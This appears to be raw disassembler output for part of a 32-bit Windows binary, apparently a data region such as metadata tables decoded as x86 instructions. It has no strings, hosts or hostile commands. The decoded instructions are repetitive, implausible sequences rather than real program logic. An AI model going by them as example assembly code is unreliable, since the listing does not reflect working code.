  405cb7:	00 a7 1a dc 05 0a    	add    %ah,0xa05dc1a(%edi)
  405cbd:	00 80 20 4f 1e 0a    	add    %al,0xa1e4f20(%eax)
  405cc3:	00 e9                	add    %ch,%cl
  405cc5:	1a 4f 1e             	sbb    0x1e(%edi),%cl
  405cc8:	06                   	push   %es
  405cc9:	00 e7                	add    %ah,%bh
  405ccb:	25 2b 00 06 00       	and    $0x6002b,%eax
  405cd0:	82 1d dc 05 06 00 7a 	sbbb   $0x7a,0x605dc
  405cd7:	15 dc 05 0a 00       	adc    $0xa05dc,%eax
  405cdc:	2b 0f                	sub    (%edi),%ecx
  405cde:	4f                   	dec    %edi
  405cdf:	1e                   	push   %ds
  405ce0:	06                   	push   %es
  405ce1:	00 ba 1a dc 05 0a    	add    %bh,0xa05dc1a(%edx)
  405ce7:	00 49 0f             	add    %cl,0xf(%ecx)
  405cea:	4f                   	dec    %edi
  405ceb:	1e                   	push   %ds
  405cec:	06                   	push   %es
  405ced:	00 65 26             	add    %ah,0x26(%ebp)
  405cf0:	2b 00                	sub    (%eax),%eax
  405cf2:	16                   	push   %ss
  405cf3:	00 97 1f fd 0a 06    	add    %dl,0x60afd1f(%edi)
  405cf9:	00 bb 16 2b 00 06    	add    %bh,0x6002b16(%ebx)
  405cff:	00 ef                	add    %ch,%bh
  405d01:	0e                   	push   %cs
  405d02:	dc 05 06 00 13 18    	faddl  0x18130006
  405d08:	dc 05 06 00 e9 0d    	faddl  0xde90006
  405d0e:	dc 05 06 00 8f 1d    	faddl  0x1d8f0006
  405d14:	dc 05 06 00 b0 1a    	faddl  0x1ab00006
  405d1a:	dc 05 16 00 c9 1a    	faddl  0x1ac90016
  405d20:	71 1e                	jno    0x405d40
  405d22:	1a 00                	sbb    (%eax),%al
  405d24:	35 1d 3d 22 1a       	xor    $0x1a223d1d,%eax
  405d29:	00 f6                	add    %dh,%dh
  405d2b:	19 3d 22 8b 01 c1    	sbb    %edi,0xc1018b22
  405d31:	1d 00 00 1a 00       	sbb    $0x1a0000,%eax
  405d36:	34 21                	xor    $0x21,%al
  405d38:	3d 22 06 00 48       	cmp    $0x48000622,%eax
  405d3d:	1e                   	push   %ds
  405d3e:	78 18                	js     0x405d58
  405d40:	06                   	push   %es
  405d41:	00 46 00             	add    %al,0x0(%esi)
  405d44:	78 18                	js     0x405d5e
  405d46:	06                   	push   %es
  405d47:	00 6f 18             	add    %ch,0x18(%edi)
  405d4a:	78 18                	js     0x405d64
  405d4c:	06                   	push   %es
  405d4d:	00 70 00             	add    %dh,0x0(%eax)
  405d50:	78 18                	js     0x405d6a
  405d52:	06                   	push   %es
  405d53:	00 7c 1c f3          	add    %bh,-0xd(%esp,%ebx,1)
  405d57:	25 06 00 a6 18       	and    $0x18a60006,%eax
  405d5c:	f3 25 06 00 e2 0f    	repz and $0xfe20006,%eax
  405d62:	78 18                	js     0x405d7c
  405d64:	06                   	push   %es
  405d65:	00 0c 19             	add    %cl,(%ecx,%ebx,1)
  405d68:	78 18                	js     0x405d82
  405d6a:	1e                   	push   %ds
  405d6b:	00 9f 19 e7 1f 06    	add    %bl,0x61fe719(%edi)
  405d71:	00 9c 26 56 17 06 00 	add    %bl,0x61756(%esi,%eiz,1)
  405d78:	70 17                	jo     0x405d91
  405d7a:	56                   	push   %esi
  405d7b:	17                   	pop    %ss
  405d7c:	06                   	push   %es
  405d7d:	00 09                	add    %cl,(%ecx)
  405d7f:	0f 56 17             	orps   (%edi),%xmm2
  405d82:	06                   	push   %es
  405d83:	00 12                	add    %dl,(%edx)
  405d85:	0c 78                	or     $0x78,%al
  405d87:	18 06                	sbb    %al,(%esi)
  405d89:	00 db                	add    %bl,%bl
  405d8b:	0e                   	push   %cs
  405d8c:	e8 13 0a 00 4e       	call   0x4e4067a4
  405d91:	1d 2b 00 0a 00       	sbb    $0xa002b,%eax
  405d96:	b3 20                	mov    $0x20,%bl
  405d98:	2b 00                	sub    (%eax),%eax
  405d9a:	06                   	push   %es
  405d9b:	00 50 0d             	add    %dl,0xd(%eax)
  405d9e:	2b 00                	sub    (%eax),%eax
  405da0:	43                   	inc    %ebx
  405da1:	00 fe                	add    %bh,%dh
  405da3:	1d 00 00 12 00       	sbb    $0x120000,%eax
  405da8:	69 0e 0e 1c 06 00    	imul   $0x61c0e,(%esi),%ecx
  405dae:	0b 00                	or     (%eax),%eax
  405db0:	e2 0a                	loop   0x405dbc
  405db2:	06                   	push   %es
  405db3:	00 3e                	add    %bh,(%esi)
  405db5:	19 78 18             	sbb    %edi,0x18(%eax)
  405db8:	06                   	push   %es
  405db9:	00 10                	add    %dl,(%eax)
  405dbb:	26 ca 19 06          	es lret $0x619
  405dbf:	00 58 10             	add    %bl,0x10(%eax)
  405dc2:	78 18                	js     0x405ddc
  405dc4:	06                   	push   %es
  405dc5:	00 09                	add    %cl,(%ecx)
  405dc7:	1e                   	push   %ds
  405dc8:	78 18                	js     0x405de2
  405dca:	06                   	push   %es
  405dcb:	00 b7 0e 78 18 22    	add    %dh,0x2218780e(%edi)
  405dd1:	00 d6                	add    %dl,%dh
  405dd3:	1a d5                	sbb    %ch,%dl
  405dd5:	1c 22                	sbb    $0x22,%al
  405dd7:	00 6d 1f             	add    %ch,0x1f(%ebp)
  405dda:	d5 1c                	aad    $0x1c
  405ddc:	22 00                	and    (%eax),%al
  405dde:	fc                   	cld
  405ddf:	1c d5                	sbb    $0xd5,%al
  405de1:	1c 12                	sbb    $0x12,%al
  405de3:	00 f4                	add    %dh,%ah
  405de5:	1c ae                	sbb    $0xae,%al
  405de7:	1e                   	push   %ds
  405de8:	22 00                	and    (%eax),%al
  405dea:	85 1f                	test   %ebx,(%edi)
  405dec:	d5 1c                	aad    $0x1c
  405dee:	06                   	push   %es
  405def:	00 44 1f f3          	add    %al,-0xd(%edi,%ebx,1)
  405df3:	25 06 00 4b 1a       	and    $0x1a4b0006,%eax
  405df8:	78 18                	js     0x405e12
  405dfa:	06                   	push   %es
  405dfb:	00 4b 1f             	add    %cl,0x1f(%ebx)
  405dfe:	f3 25 12 00 ae 1c    	repz and $0x1cae0012,%eax
  405e04:	f3 25 06 00 36 18    	repz and $0x18360006,%eax
  405e0a:	f3 25 06 00 87 00    	repz and $0x870006,%eax
  405e10:	f3 25 06 00 35 1a    	repz and $0x1a350006,%eax
  405e16:	78 18                	js     0x405e30
  405e18:	06                   	push   %es
  405e19:	00 7f 18             	add    %bh,0x18(%edi)
  405e1c:	f3 25 06 00 2e 0e    	repz and $0xe2e0006,%eax
  405e22:	f3 25 06 00 f2 0d    	repz and $0xdf20006,%eax
  405e28:	f3 25 06 00 cc 18    	repz and $0x18cc0006,%eax
  405e2e:	f3 25 06 00 0d 0e    	repz and $0xe0d0006,%eax
  405e34:	f3 25 06 00 1e 1a    	repz and $0x1a1e0006,%eax
  405e3a:	f3 25 06 00 12 1d    	repz and $0x1d120006,%eax
  405e40:	78 18                	js     0x405e5a
  405e42:	06                   	push   %es
  405e43:	00 9d 25 78 18 06    	add    %bl,0x6187825(%ebp)
  405e49:	00 4c 20 ae          	add    %cl,-0x52(%eax,%eiz,1)
  405e4d:	1e                   	push   %ds
  405e4e:	06                   	push   %es
  405e4f:	00 94 0e 78 18 06 00 	add    %dl,0x61878(%esi,%ecx,1)
  405e56:	c5 0b                	lds    (%ebx),%ecx
  405e58:	f3 25 06 00 67 00    	repz and $0x670006,%eax
  405e5e:	78 18                	js     0x405e78
  405e60:	06                   	push   %es
  405e61:	00 82 0e 78 18 06    	add    %al,0x618780e(%edx)
  405e67:	00 e8                	add    %ch,%al
  405e69:	0e                   	push   %cs
  405e6a:	78 18                	js     0x405e84
  405e6c:	06                   	push   %es
  405e6d:	00 6b 20             	add    %ch,0x20(%ebx)
  405e70:	dc 05 06 00 5d 10    	faddl  0x105d0006
  405e76:	dc 05 0a 00 43 18    	faddl  0x1843000a
  405e7c:	89 19                	mov    %ebx,(%ecx)
  405e7e:	0a 00                	or     (%eax),%al
  405e80:	1e                   	push   %ds
  405e81:	0e                   	push   %cs
  405e82:	89 19                	mov    %ebx,(%ecx)
  405e84:	00 00                	add    %al,(%eax)
  405e86:	00 00                	add    %al,(%eax)
  405e88:	9b                   	fwait
  405e89:	00 00                	add    %al,(%eax)
  405e8b:	00 00                	add    %al,(%eax)
  405e8d:	00 01                	add    %al,(%ecx)
  405e8f:	00 01                	add    %al,(%ecx)
  405e91:	00 01                	add    %al,(%ecx)
  405e93:	00 10                	add    %dl,(%eax)
  405e95:	00 24 24             	add    %ah,(%esp)
  405e98:	94                   	xchg   %eax,%esp
  405e99:	13 05 00 01 00 01    	adc    0x1000100,%eax
  405e9f:	00 81 01 10 00 35    	add    %al,0x35001001(%ecx)
  405ea5:	01 94 13 05 00 01 00 	add    %edx,0x10005(%ebx,%edx,1)
  405eac:	03 00                	add    (%eax),%eax
  405eae:	81 01 10 00 22 16    	addl   $0x16220010,(%ecx)
  405eb4:	c2 12 05             	ret    $0x512
  405eb7:	00 13                	add    %dl,(%ebx)
  405eb9:	00 06                	add    %al,(%esi)
  405ebb:	00 00                	add    %al,(%eax)
  405ebd:	00 10                	add    %dl,(%eax)
  405ebf:	00 af 13 b2 06 05    	add    %ch,0x506b213(%edi)
  405ec5:	00 1e                	add    %bl,(%esi)
  405ec7:	00 24 00             	add    %ah,(%eax,%eax,1)
  405eca:	00 00                	add    %al,(%eax)
  405ecc:	10 00                	adc    %al,(%eax)
  405ece:	3e 24 00             	ds and $0x0,%al
  405ed1:	07                   	pop    %es
  405ed2:	05 00 1e 00 26       	add    $0x26001e00,%eax
  405ed7:	00 81 01 10 00 b4    	add    %al,-0x4bffefff(%ecx)
  405edd:	09 00                	or     %eax,(%eax)
  405edf:	07                   	pop    %es
  405ee0:	05 00 1e 00 2d       	add    $0x2d001e00,%eax
  405ee5:	00 81 01 10 00 d9    	add    %al,-0x26ffefff(%ecx)
  405eeb:	1b 00                	sbb    (%eax),%eax
  405eed:	07                   	pop    %es
  405eee:	05 00 1e 00 2f       	add    $0x2f001e00,%eax
  405ef3:	00 81 01 10 00 11    	add    %al,0x11001001(%ecx)
  405ef9:	17                   	pop    %ss
  405efa:	00 07                	add    %al,(%edi)
  405efc:	05 00 1e 00 30       	add    $0x30001e00,%eax
  405f01:	00 81 01 10 00 8f    	add    %al,-0x70ffefff(%ecx)
  405f07:	0d 00 07 05 00       	or     $0x50700,%eax
  405f0c:	1e                   	push   %ds
  405f0d:	00 36                	add    %dh,(%esi)
  405f0f:	00 81 01 10 00 ad    	add    %al,-0x52ffefff(%ecx)
  405f15:	03 00                	add    (%eax),%eax
  405f17:	07                   	pop    %es
  405f18:	05 00 1f 00 38       	add    $0x38001f00,%eax
  405f1d:	00 02                	add    %al,(%edx)
  405f1f:	01 00                	add    %eax,(%eax)
  405f21:	00 12                	add    %dl,(%edx)
  405f23:	04 00                	add    $0x0,%al
  405f25:	00 39                	add    %bh,(%ecx)
  405f27:	00 1f                	add    %bl,(%edi)
  405f29:	00 3e                	add    %bh,(%esi)
  405f2b:	00 81 01 10 00 bd    	add    %al,-0x42ffefff(%ecx)
  405f31:	01 00                	add    %eax,(%eax)
  405f33:	07                   	pop    %es
  405f34:	05 00 23 00 3e       	add    $0x3e002300,%eax
  405f39:	00 81 01 10 00 31    	add    %al,0x31001001(%ecx)
  405f3f:	02 00                	add    (%eax),%al
  405f41:	07                   	pop    %es
  405f42:	05 00 23 00 41       	add    $0x41002300,%eax
  405f47:	00 81 01 10 00 2b    	add    %al,0x2b001001(%ecx)
  405f4d:	0a 1d 17 05 00 24    	or     0x24000517,%bl
  405f53:	00 46 00             	add    %al,0x0(%esi)
  405f56:	83 01 10             	addl   $0x10,(%ecx)
  405f59:	00 63 06             	add    %ah,0x6(%ebx)
  405f5c:	00 00                	add    %al,(%eax)
  405f5e:	05 00 25 00 4b       	add    $0x4b002500,%eax
  405f63:	00 01                	add    %al,(%ecx)
  405f65:	00 10                	add    %dl,(%eax)
  405f67:	00 51 08             	add    %dl,0x8(%ecx)
  405f6a:	31 16                	xor    %edx,(%esi)
  405f6c:	05 00 26 00 4b       	add    $0x4b002600,%eax
  405f71:	00 81 01 10 00 3a    	add    %al,0x3a001001(%ecx)
  405f77:	07                   	pop    %es
  405f78:	31 16                	xor    %edx,(%esi)
  405f7a:	05 00 2d 00 52       	add    $0x52002d00,%eax
  405f7f:	00 00                	add    %al,(%eax)
  405f81:	01 00                	add    %eax,(%eax)
  405f83:	00 62 0d             	add    %ah,0xd(%edx)
  405f86:	00 00                	add    %al,(%eax)
  405f88:	05 00 2d 00 54       	add    $0x54002d00,%eax
  405f8d:	00 13                	add    %dl,(%ebx)
  405f8f:	01 00                	add    %eax,(%eax)
  405f91:	00 cf                	add    %cl,%bh
  405f93:	0d 00 00 51 00       	or     $0x510000,%eax
  405f98:	2e 00 54 00 01       	add    %dl,%cs:0x1(%eax,%eax,1)
  405f9d:	00 10                	add    %dl,(%eax)
  405f9f:	00 d3                	add    %dl,%bl
  405fa1:	00 2a                	add    %ch,(%edx)
  405fa3:	03 05 00 2e 00 54    	add    0x54002e00,%eax
  405fa9:	00 01                	add    %al,(%ecx)
  405fab:	00 10                	add    %dl,(%eax)
  405fad:	00 22                	add    %ah,(%edx)
  405faf:	08 2a                	or     %ch,(%edx)
  405fb1:	03 05 00 2f 00 5f    	add    0x5f002f00,%eax
  405fb7:	00 01                	add    %al,(%ecx)
  405fb9:	00 10                	add    %dl,(%eax)
  405fbb:	00 5b 05             	add    %bl,0x5(%ebx)
  405fbe:	2a 03                	sub    (%ebx),%al
  405fc0:	05 00 31 00 63       	add    $0x63003100,%eax
  405fc5:	00 01                	add    %al,(%ecx)
  405fc7:	00 10                	add    %dl,(%eax)
  405fc9:	00 5e 08             	add    %bl,0x8(%esi)
  405fcc:	2a 03                	sub    (%ebx),%al
  405fce:	05 00 33 00 6a       	add    $0x6a003300,%eax
  405fd3:	00 01                	add    %al,(%ecx)
  405fd5:	01 00                	add    %eax,(%eax)
  405fd7:	00 9e 08 2a 03 39    	add    %bl,0x39032a08(%esi)
  405fdd:	00 3a                	add    %bh,(%edx)
  405fdf:	00 95 00 00 00 10    	add    %dl,0x10000000(%ebp)
  405fe5:	00 af 24 2a 03 05    	add    %ch,0x5032a24(%edi)
  405feb:	00 47 00             	add    %al,0x0(%edi)
  405fee:	95                   	xchg   %eax,%ebp
  405fef:	00 00                	add    %al,(%eax)
  405ff1:	00 10                	add    %dl,(%eax)
  405ff3:	00 22                	add    %ah,(%edx)
  405ff5:	19 2a                	sbb    %ebp,(%edx)
  405ff7:	03 05 00 47 00 99    	add    0x99004700,%eax
  405ffd:	00 81 01 10 00 8f    	add    %al,-0x70ffefff(%ecx)
  406003:	03 2a                	add    (%edx),%ebp
  406005:	03 05 00 47 00 a2    	add    0xa2004700,%eax
  40600b:	00 00                	add    %al,(%eax)
  40600d:	01 00                	add    %eax,(%eax)
  40600f:	00 d8                	add    %bl,%al
  406011:	02 00                	add    (%eax),%al
  406013:	00 05 00 47 00 a4    	add    %al,0xa4004700
  406019:	00 13                	add    %dl,(%ebx)
  40601b:	01 00                	add    %eax,(%eax)
  40601d:	00 46 09             	add    %al,0x9(%esi)
  406020:	00 00                	add    %al,(%eax)
  406022:	51                   	push   %ecx
  406023:	00 48 00             	add    %cl,0x0(%eax)
  406026:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406027:	00 16                	add    %dl,(%esi)
  406029:	00 f3                	add    %dh,%bl
  40602b:	05 12 00 16 00       	add    $0x160012,%eax
  406030:	d5 01                	aad    $0x1
  406032:	12 00                	adc    (%eax),%al
  406034:	16                   	push   %ss
  406035:	00 16                	add    %dl,(%esi)
  406037:	1b 12                	sbb    (%edx),%edx
  406039:	00 16                	add    %dl,(%esi)
  40603b:	00 69 1b             	add    %ch,0x1b(%ecx)
  40603e:	12 00                	adc    (%eax),%al
  406040:	16                   	push   %ss
  406041:	00 b4 15 12 00 16 00 	add    %dh,0x160012(%ebp,%edx,1)
  406048:	d1 07                	roll   $1,(%edi)
  40604a:	12 00                	adc    (%eax),%al
  40604c:	16                   	push   %ss
  40604d:	00 53 04             	add    %dl,0x4(%ebx)
  406050:	12 00                	adc    (%eax),%al
  406052:	16                   	push   %ss
  406053:	00 14 27             	add    %dl,(%edi,%eiz,1)
  406056:	12 00                	adc    (%eax),%al
  406058:	16                   	push   %ss
  406059:	00 3c 0b             	add    %bh,(%ebx,%ecx,1)
  40605c:	12 00                	adc    (%eax),%al
  40605e:	16                   	push   %ss
  40605f:	00 86 06 12 00 16    	add    %al,0x16001206(%esi)
  406065:	00 6e 0d             	add    %ch,0xd(%esi)
  406068:	15 00 16 00 04       	adc    $0x4001600,%eax
  40606d:	27                   	daa
  40606e:	12 00                	adc    (%eax),%al
  406070:	16                   	push   %ss
  406071:	00 e0                	add    %ah,%al
  406073:	17                   	pop    %ss
  406074:	19 00                	sbb    %eax,(%eax)
  406076:	16                   	push   %ss
  406077:	00 08                	add    %cl,(%eax)
  406079:	0a 12                	or     (%edx),%dl
  40607b:	00 16                	add    %dl,(%esi)
  40607d:	00 07                	add    %al,(%edi)
  40607f:	08 12                	or     %dl,(%edx)
  406081:	00 16                	add    %dl,(%esi)
  406083:	00 07                	add    %al,(%edi)
  406085:	16                   	push   %ss
  406086:	12 00                	adc    (%eax),%al
  406088:	16                   	push   %ss
  406089:	00 e6                	add    %ah,%dh
  40608b:	16                   	push   %ss
  40608c:	12 00                	adc    (%eax),%al
  40608e:	16                   	push   %ss
  40608f:	00 f4                	add    %dh,%ah
  406091:	1b 12                	sbb    (%edx),%edx
  406093:	00 11                	add    %dl,(%ecx)
  406095:	00 1e                	add    %bl,(%esi)
  406097:	0d 21 00 11 00       	or     $0x110021,%eax
  40609c:	03 0d 25 00 11 00    	add    0x110025,%ecx
  4060a2:	d3 0c 29             	rorl   %cl,(%ecx,%ebp,1)
  4060a5:	00 11                	add    %dl,(%ecx)
  4060a7:	00 69 0c             	add    %ch,0xc(%ecx)
  4060aa:	2d 00 11 00 eb       	sub    $0xeb001100,%eax
  4060af:	0c 2d                	or     $0x2d,%al
  4060b1:	00 11                	add    %dl,(%ecx)
  4060b3:	00 4e 0c             	add    %cl,0xc(%esi)
  4060b6:	30 00                	xor    %al,(%eax)
  4060b8:	11 00                	adc    %eax,(%eax)
  4060ba:	31 0c 34             	xor    %ecx,(%esp,%esi,1)
  4060bd:	00 31                	add    %dh,(%ecx)
  4060bf:	00 17                	add    %dl,(%edi)
  4060c1:	0c 37                	or     $0x37,%al
  4060c3:	00 11                	add    %dl,(%ecx)
  4060c5:	00 85 0c 30 00 11    	add    %al,0x1100300c(%ebp)
  4060cb:	00 b9 0c 3a 00 11    	add    %bh,0x11003a0c(%ecx)
  4060d1:	00 9b 0c 34 00 16    	add    %bl,0x1600340c(%ebx)
  4060d7:	00 d7                	add    %dl,%bh
  4060d9:	03 dc                	add    %esp,%ebx
  4060db:	00 06                	add    %al,(%esi)
  4060dd:	06                   	push   %es
  4060de:	92                   	xchg   %eax,%edx
  4060df:	09 06                	or     %eax,(%esi)
  4060e1:	01 56 80             	add    %edx,-0x80(%esi)
  4060e4:	cc                   	int3
  4060e5:	23 09                	and    (%ecx),%ecx
  4060e7:	01 56 80             	add    %edx,-0x80(%esi)
  4060ea:	24 02                	and    $0x2,%al
  4060ec:	09 01                	or     %eax,(%ecx)
  4060ee:	56                   	push   %esi
  4060ef:	80 6f 01 09          	subb   $0x9,0x1(%edi)
  4060f3:	01 31                	add    %esi,(%ecx)
  4060f5:	00 56 06             	add    %dl,0x6(%esi)
  4060f8:	12 00                	adc    (%eax),%al
  4060fa:	16                   	push   %ss
  4060fb:	00 0f                	add    %cl,(%edi)
  4060fd:	03 30                	add    (%eax),%esi
  4060ff:	01 16                	add    %edx,(%esi)
  406101:	00 9b 04 43 01 51    	add    %bl,0x51014304(%ebx)
  406107:	80 c5 0a             	add    $0xa,%ch
  40610a:	3a 00                	cmp    (%eax),%al
  40610c:	51                   	push   %ecx
  40610d:	80 72 25 3a          	xorb   $0x3a,0x25(%edx)
  406111:	00 51 80             	add    %dl,-0x80(%ecx)
  406114:	d5 17                	aad    $0x17
  406116:	3a 00                	cmp    (%eax),%al
  406118:	51                   	push   %ecx
  406119:	80 ec 07             	sub    $0x7,%ah
  40611c:	3a 00                	cmp    (%eax),%al
  40611e:	21 00                	and    %eax,(%eax)
  406120:	fc                   	cld
  406121:	17                   	pop    %ss
  406122:	29 00                	sub    %eax,(%eax)
  406124:	21 00                	and    %eax,(%eax)
  406126:	62 04 29             	bound  %eax,(%ecx,%ebp,1)
  406129:	00 31                	add    %dh,(%ecx)
  40612b:	00 f9                	add    %bh,%cl
  40612d:	09 29                	or     %ebp,(%ecx)
  40612f:	00 33                	add    %dh,(%ebx)
  406131:	01 af 1b 8b 01 11    	add    %ebp,0x11018b1b(%edi)
  406137:	00 55 09             	add    %dl,0x9(%ebp)
  40613a:	8f 01                	pop    (%ecx)
  40613c:	01 00                	add    %eax,(%eax)
  40613e:	f2 01 30             	repnz add %esi,(%eax)
  406141:	01 01                	add    %eax,(%ecx)
  406143:	00 25 05 3a 00 01    	add    %ah,0x1003a05
  406149:	00 f2                	add    %dh,%dl
  40614b:	01 30                	add    %esi,(%eax)
  40614d:	01 01                	add    %eax,(%ecx)
  40614f:	00 10                	add    %dl,(%eax)
  406151:	25 c7 01 01 00       	and    $0x101c7,%eax
  406156:	73 07                	jae    0x40615f
  406158:	12 00                	adc    (%eax),%al
  40615a:	01 00                	add    %eax,(%eax)
  40615c:	76 0b                	jbe    0x406169
  40615e:	12 00                	adc    (%eax),%al
  406160:	01 00                	add    %eax,(%eax)
  406162:	7a 13                	jp     0x406177
  406164:	37                   	aaa
  406165:	00 01                	add    %al,(%ecx)
  406167:	00 70 04             	add    %dh,0x4(%eax)
  40616a:	02 02                	add    (%edx),%al
  40616c:	01 00                	add    %eax,(%eax)
  40616e:	0c 01                	or     $0x1,%al
  406170:	c7 01 01 00 f2 01    	movl   $0x1f20001,(%ecx)
  406176:	30 01                	xor    %al,(%ecx)
  406178:	01 00                	add    %eax,(%eax)
  40617a:	26 01 06             	add    %eax,%es:(%esi)
  40617d:	02 06                	add    (%esi),%al
  40617f:	06                   	push   %es
  406180:	92                   	xchg   %eax,%edx
  406181:	09 3a                	or     %edi,(%edx)
  406183:	00 56 80             	add    %dl,-0x80(%esi)
  406186:	17                   	pop    %ss
  406187:	02 02                	add    (%edx),%al
  406189:	02 56 80             	add    -0x80(%esi),%dl
  40618c:	73 09                	jae    0x406197
  40618e:	02 02                	add    (%edx),%al
  406190:	56                   	push   %esi
  406191:	80 58 25 02          	sbbb   $0x2,0x25(%eax)
  406195:	02 56 80             	add    -0x80(%esi),%dl
  406198:	d3 08                	rorl   %cl,(%eax)
  40619a:	02 02                	add    (%edx),%al
  40619c:	56                   	push   %esi
  40619d:	80 40 25 02          	addb   $0x2,0x25(%eax)
  4061a1:	02 56 80             	add    -0x80(%esi),%dl
  4061a4:	b3 00                	mov    $0x0,%bl
  4061a6:	02 02                	add    (%edx),%al
  4061a8:	56                   	push   %esi
  4061a9:	80 48 1c 02          	orb    $0x2,0x1c(%eax)
  4061ad:	02 56 80             	add    -0x80(%esi),%dl
  4061b0:	05 04 02 02 56       	add    $0x56020204,%eax
  4061b5:	80 5d 1b 02          	sbbb   $0x2,0x1b(%ebp)
  4061b9:	02 56 80             	add    -0x80(%esi),%dl
  4061bc:	08 24 02             	or     %ah,(%edx,%eax,1)
  4061bf:	02 56 80             	add    -0x80(%esi),%dl
  4061c2:	ee                   	out    %al,(%dx)
  4061c3:	20 02                	and    %al,(%edx)
  4061c5:	02 56 80             	add    -0x80(%esi),%dl
  4061c8:	26 15 02 02 33 01    	es adc $0x1330202,%eax
  4061ce:	8c 04 fd 02 08 26 00 	mov    %es,0x260802(,%edi,8)
  4061d5:	00 00                	add    %al,(%eax)
  4061d7:	00 96 00 2f 19 0a    	add    %dl,0xa192f00(%esi)
  4061dd:	00 01                	add    %al,(%ecx)
  4061df:	00 78 20             	add    %bh,0x20(%eax)
  4061e2:	00 00                	add    %al,(%eax)
  4061e4:	00 00                	add    %al,(%eax)
  4061e6:	86 18                	xchg   %bl,(%eax)
  4061e8:	13 1e                	adc    (%esi),%ebx
  4061ea:	0e                   	push   %cs
  4061eb:	00 01                	add    %al,(%ecx)
  4061ed:	00 f8                	add    %bh,%al
  4061ef:	26 00 00             	add    %al,%es:(%eax)
  4061f2:	00 00                	add    %al,(%eax)
  4061f4:	96                   	xchg   %eax,%esi
  4061f5:	00 17                	add    %dl,(%edi)
  4061f7:	15 1d 00 01 00       	adc    $0x1001d,%eax
  4061fc:	50                   	push   %eax
  4061fd:	28 00                	sub    %al,(%eax)
  4061ff:	00 00                	add    %al,(%eax)
  406201:	00 91 00 fb 23 1d    	add    %dl,0x1d23fb00(%ecx)
  406207:	00 01                	add    %al,(%ecx)
  406209:	00 c0                	add    %al,%al
  40620b:	28 00                	sub    %al,(%eax)
  40620d:	00 00                	add    %al,(%eax)
  40620f:	00 91 18 19 1e 0a    	add    %dl,0xa1e1918(%ecx)
  406215:	00 01                	add    %al,(%ecx)
  406217:	00 80 20 00 00 00    	add    %al,0x20(%eax)
  40621d:	00 96 08 0c 22 3d    	add    %dl,0x3d220c08(%esi)
  406223:	00 01                	add    %al,(%ecx)
  406225:	00 87 20 00 00 00    	add    %al,0x20(%edi)
  40622b:	00 96 08 1a 22 42    	add    %dl,0x42221a08(%esi)
  406231:	00 01                	add    %al,(%ecx)
  406233:	00 8f 20 00 00 00    	add    %cl,0x20(%edi)
  406239:	00 96 08 f0 21 48    	add    %dl,0x4821f008(%esi)
  40623f:	00 02                	add    %al,(%edx)
  406241:	00 96 20 00 00 00    	add    %dl,0x20(%esi)
  406247:	00 96 08 fe 21 4d    	add    %dl,0x4d21fe08(%esi)
  40624d:	00 02                	add    %al,(%edx)
  40624f:	00 9e 20 00 00 00    	add    %bl,0x20(%esi)
  406255:	00 91 08 03 1d 53    	add    %dl,0x531d0308(%ecx)
  40625b:	00 03                	add    %al,(%ebx)
  40625d:	00 a5 20 00 00 00    	add    %ah,0x20(%ebp)
  406263:	00 91 08 0e 1d 58    	add    %dl,0x581d0e08(%ecx)
  406269:	00 03                	add    %al,(%ebx)
  40626b:	00 ad 20 00 00 00    	add    %ch,0x20(%ebp)
  406271:	00 91 08 0c 13 5e    	add    %dl,0x5e130c08(%ecx)
  406277:	00 04 00             	add    %al,(%eax,%eax,1)
  40627a:	b4 20                	mov    $0x20,%ah
  40627c:	00 00                	add    %al,(%eax)
  40627e:	00 00                	add    %al,(%eax)
  406280:	91                   	xchg   %eax,%ecx
  406281:	08 1b                	or     %bl,(%ebx)
  406283:	13 62 00             	adc    0x0(%edx),%esp
  406286:	04 00                	add    $0x0,%al
  406288:	bc 20 00 00 00       	mov    $0x20,%esp
  40628d:	00 91 08 a7 21 5e    	add    %dl,0x5e21a708(%ecx)
  406293:	00 05 00 c3 20 00    	add    %al,0x20c300
  406299:	00 00                	add    %al,(%eax)
  40629b:	00 91 08 b2 21 62    	add    %dl,0x6221b208(%ecx)
  4062a1:	00 05 00 cb 20 00    	add    %al,0x20cb00
  4062a7:	00 00                	add    %al,(%eax)
  4062a9:	00 91 08 cd 12 67    	add    %dl,0x6712cd08(%ecx)
  4062af:	00 06                	add    %al,(%esi)
  4062b1:	00 d2                	add    %dl,%dl
  4062b3:	20 00                	and    %al,(%eax)
  4062b5:	00 00                	add    %al,(%eax)
  4062b7:	00 91 08 db 12 6c    	add    %dl,0x6c12db08(%ecx)
  4062bd:	00 06                	add    %al,(%esi)
  4062bf:	00 da                	add    %bl,%dl
  4062c1:	20 00                	and    %al,(%eax)
  4062c3:	00 00                	add    %al,(%eax)
  4062c5:	00 96 08 ee 0b 1d    	add    %dl,0x1d0bee08(%esi)
  4062cb:	00 07                	add    %al,(%edi)
  4062cd:	00 e1                	add    %ah,%cl
  4062cf:	20 00                	and    %al,(%eax)
  4062d1:	00 00                	add    %al,(%eax)
  4062d3:	00 96 08 fe 0b 72    	add    %dl,0x720bfe08(%esi)
  4062d9:	00 07                	add    %al,(%edi)
  4062db:	00 e9                	add    %ch,%cl
  4062dd:	20 00                	and    %al,(%eax)
  4062df:	00 00                	add    %al,(%eax)
  4062e1:	00 91 08 13 0b 77    	add    %dl,0x770b1308(%ecx)
  4062e7:	00 08                	add    %cl,(%eax)
  4062e9:	00 f0                	add    %dh,%al
  4062eb:	20 00                	and    %al,(%eax)
  4062ed:	00 00                	add    %al,(%eax)
  4062ef:	00 91 08 d6 13 67    	add    %dl,0x6713d608(%ecx)
  4062f5:	00 08                	add    %cl,(%eax)
  4062f7:	00 f7                	add    %dh,%bh
  4062f9:	20 00                	and    %al,(%eax)
  4062fb:	00 00                	add    %al,(%eax)
  4062fd:	00 91 08 df 13 6c    	add    %dl,0x6c13df08(%ecx)
  406303:	00 08                	add    %cl,(%eax)
  406305:	00 ff                	add    %bh,%bh
  406307:	20 00                	and    %al,(%eax)
  406309:	00 00                	add    %al,(%eax)
  40630b:	00 96 08 81 17 7b    	add    %dl,0x7b178108(%esi)
  406311:	00 09                	add    %cl,(%ecx)
  406313:	00 06                	add    %al,(%esi)
  406315:	21 00                	and    %eax,(%eax)
  406317:	00 00                	add    %al,(%eax)
  406319:	00 96 08 8e 17 7f    	add    %dl,0x7f178e08(%esi)
  40631f:	00 09                	add    %cl,(%ecx)
  406321:	00 0e                	add    %cl,(%esi)
  406323:	21 00                	and    %eax,(%eax)
  406325:	00 00                	add    %al,(%eax)
  406327:	00 96 08 ca 14 1d    	add    %dl,0x1d14ca08(%esi)
  40632d:	00 0a                	add    %cl,(%edx)
